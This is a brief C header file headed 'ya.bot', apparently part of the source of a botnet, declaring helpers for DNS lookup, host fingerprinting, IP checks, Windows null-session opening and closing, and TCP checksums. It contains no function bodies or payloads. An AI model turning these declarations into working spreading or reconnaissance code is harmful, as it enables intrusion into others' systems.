/*  ya.bot  */

bool dnslookup(char *pszHost, char *pszBuffer, DWORD dwSize);
int fphost(char *pszIP, int nPort);
char *ip_getip(SOCKET sock);
bool ip_privateip(char *pszIP);
bool ip_validip(char *pszIP);
bool nullsession_close(char *pszHost);
bool nullsession_open(char *pszHost);
USHORT tcpchecksum(USHORT *usBuffer, int nSize);